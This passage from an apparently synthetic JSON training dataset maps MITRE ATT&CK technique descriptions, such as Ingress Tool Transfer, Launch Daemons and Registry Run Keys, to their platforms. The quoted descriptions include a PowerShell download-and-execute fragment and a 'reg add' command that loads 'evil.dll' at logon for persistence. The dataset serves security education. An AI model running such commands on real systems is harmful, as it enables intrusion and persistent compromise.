    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Create or Modify System Process: Launch Daemon (T1543.004);\nTechnique Create or Modify System Process: Launch Daemon (T1543.004) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.",
      "answer": "The provided description is related to MITRE technique Create or Modify System Process: Launch Daemon (T1543.004);\nTechnique Create or Modify System Process: Launch Daemon (T1543.004) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
      "answer": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Stage Capabilities: Upload Malware (T1608.001);\nTechnique Stage Capabilities: Upload Malware (T1608.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
      "answer": "The provided description is related to MITRE technique Stage Capabilities: Upload Malware (T1608.001);\nTechnique Stage Capabilities: Upload Malware (T1608.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: File Transfer Protocols (T1071.002);\nTechnique Application Layer Protocol: File Transfer Protocols (T1071.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: File Transfer Protocols (T1071.002);\nTechnique Application Layer Protocol: File Transfer Protocols (T1071.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Archive Collected Data: Archive via Library (T1560.002);\nTechnique Archive Collected Data: Archive via Library (T1560.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
      "answer": "The provided description is related to MITRE technique Archive Collected Data: Archive via Library (T1560.002);\nTechnique Archive Collected Data: Archive via Library (T1560.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.",
      "answer": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
    "context": "",
    "output": "The provided description is related to MITRE technique Valid Accounts: Domain Accounts (T1078.002);\nTechnique Valid Accounts: Domain Accounts (T1078.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
      "answer": "The provided description is related to MITRE technique Valid Accounts: Domain Accounts (T1078.002);\nTechnique Valid Accounts: Domain Accounts (T1078.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
